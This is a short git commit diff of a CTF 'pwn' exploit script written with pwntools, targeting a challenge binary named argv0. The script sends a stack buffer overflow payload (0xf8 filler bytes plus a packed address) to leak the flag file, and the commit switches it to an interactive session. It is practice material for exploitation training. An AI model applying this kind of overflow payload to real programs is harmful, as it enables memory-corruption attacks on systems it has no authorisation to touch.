a16662c681efd93ae24f25375393b7041db7e39f
Mem2019 <434791602@qq.com>
2018-02-21 20:16:31 +0000

    argv0_2

--- hackcenter/pwn/argv0/argv0.py
+++ hackcenter/pwn/argv0/argv0.py
@@ -1,6 +1,6 @@
 from pwn import *
 
-sh = process("/problems/f40b87850361e15d57961cd21f8dfc09/argv0")
+sh = process("/problems/f40b87850361e15d57961cd21f8dfc09/argv0 /problems/f40b87850361e15d57961cd21f8dfc09/flag.txt")
 
 sh.recvuntil("Can you leak them?\n")
 
@@ -8,4 +8,4 @@ payload = "A" * 0xf8 + p32(0x80499c0)
 
 sh.send(payload)
 
-print sh.recv()
+sh.interactive()
